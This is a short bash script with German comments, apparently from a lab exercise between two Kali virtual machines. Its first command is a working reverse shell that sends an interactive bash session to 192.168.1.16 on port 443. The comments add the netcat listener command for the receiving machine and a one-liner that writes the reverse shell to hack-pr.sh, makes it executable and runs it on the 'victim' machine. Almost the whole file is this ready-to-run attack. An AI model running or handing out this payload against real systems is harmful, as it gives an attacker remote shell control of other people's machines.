#!/bin/bash
bash -i >& /dev/tcp/192.168.1.16/443 0>&1


# Daemon Starten ; hört nun auf alle Anfragen auf port 443

# Kali VM 1 Listener
# nc -vv -l -p 443

#Kali VM 2 Bash
# touch hack-pr.sh; echo '#!/bin/bash' > hack-pr.sh; echo 'bash -i >& /dev/tcp/192.168.1.16/443 0>&1' >> hack-pr.sh; chmod +x hack-pr.sh; ./hack-pr.sh

# Nun ist Kali VM 2 das Opfer, von Kali VM 1 kann wird nun die ganze Bash umgeleitet